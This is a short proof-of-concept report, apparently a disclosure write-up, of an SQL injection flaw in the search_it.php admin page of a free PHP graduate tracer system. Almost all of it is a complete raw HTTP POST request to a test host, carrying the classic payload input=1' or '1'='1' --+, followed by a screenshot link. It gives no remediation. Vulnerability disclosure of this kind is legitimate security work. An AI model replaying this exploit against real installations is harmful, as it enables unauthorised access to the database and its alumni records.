# Online Graduate Tracer System for College of ICT Alumni in PHP Free Source Code
### vendors:https://www.sourcecodester.com/php/15904/online-graduate-tracer-system-college-ict-alumni.html
### The program is built using the phpstudy 8.1.1.3
Vulnerability File: tracking/admin/search_it.php
Vulnerability location: tracking/admin/search_it.php
####payload:post http://www.testcms.com/tracking/admin/search_it.php  data:input=*
```
POST /tracking/admin/search_it.php HTTP/1.1
Host: www.testcms.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://www.testcms.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://www.testcms.com/tracking/admin/adminlog.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: XDEBUG_SESSION=XDEBUG_ECLIPSE; 
x-forwarded-for: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=1' or '1'='1' --+
```
![image](https://user-images.githubusercontent.com/127461763/224210235-19b4c723-cfd5-4288-961d-9731a34c78f5.png)
